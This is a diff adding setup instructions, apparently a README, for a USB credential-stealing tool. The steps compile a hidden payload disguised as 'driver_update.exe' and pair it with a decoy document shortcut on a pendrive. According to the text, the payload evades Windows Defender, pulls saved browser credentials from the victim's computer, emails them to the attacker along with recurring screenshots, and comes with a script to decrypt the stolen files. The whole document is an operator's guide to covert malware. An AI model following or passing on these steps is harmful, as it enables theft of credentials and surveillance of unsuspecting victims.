@@ -1,0 +1,61 @@
+1. Install Python 3.11 from Microsoft Store or Python's official website.
+
+2. Set the email configurations in '.usb_hidden_config.ini' file.
+
+3. Create a virtual environment for python 'python -m venv .venv'.
+
+4. Enable the virtual environment '.\.venv\Scripts\Activate.ps1'.
+
+5. Select and use Python 3.11 Interpreter.
+
+6. Install the requirements 'pip install -r requirements.txt'.
+
+7. Compile the 'usb_ops_final.py' by using 'pyinstaller --noconsole --onefile --icon=stealth.ico usb_ops_final.py',
+   this will create an '.exe' file named 'usb_obs_final.exe' rename it to 'driver_update.exe'.
+
+8. Compile the 'usb_preparer_gui_random.py' by using 'pyinstaller --noconsole --onefile --icon=usb.ico usb_preparer_gui_random.py',
+   this will create an '.exe' file named 'usb_preparer_gui_random.exe'.
+
+9. Insert the USB pendrive into the attacker computer.
+
+10. Double Click on 'usb_preparer_gui_random.exe' to start to prepare the pendrive using GUI.
+
+11. From the GUI select the USB Drive from the dropdown.
+
+12. Select 'driver_update.exe' as the payload.
+
+13. Select 'report.docx' as the decoy document, note: any document files with extension '.docx' or '.pdf' can be used.
+
+14. Select '.usb_hidden_config.ini' as the config file.
+
+15. Click on 'Prepare USB' and give it some time to do its thing.
+
+This will copy all the necessary files to the USB and will create shortcut to open the document file with a random name.
+
+Now your USB is ready.
+
+Now insert the USB into the Victim machine, and open the linked document, it bypasses the Microsoft Windows Defender and
+executes the exe in the background and will extract the user credentials saved in each browser installed in the Computer and
+will mail the files to the recipient mail, it will also keep sending Screenshots of the Victim machine.
+The extracted credentials are named as per the browser and are encrypted.
+For example for Microsoft Edge Browser it names the file as 'edge.xlsx.enc'.
+
+16. Copy the encrypted files to the same directory as 'decrypt_files.py'
+
+17. To decrypt the files modify the very last line of 'decrypt_files.py' and 'decrypt_file("edge.xlsx.enc", "edge_decrypted.xlsx")'
+    "edge.xlsx.enc" is the file name you want to decrypt and "edge_decrypted.xlsx" is the file name the document will be named after
+    decryption.
+
+18. Enable the virtual environment again if not already and run 'python decrypt_files.py' in the IDE terminal.
+
+19. Now open the 'edge_decrypted.xlsx' to see the credentials.
+
+NOTE: There are some limitations with the execution time. It took around 25 mins for the first mail to arrive and then the mails kept arriving every 10 mins.
+
+LIMITATIONS: It takes quite a bit of time, so the pendrive cannot be removed from the Victim computer and the linked document's name
+that was randomly generated cannot be renamed.
+
+
+
+
+
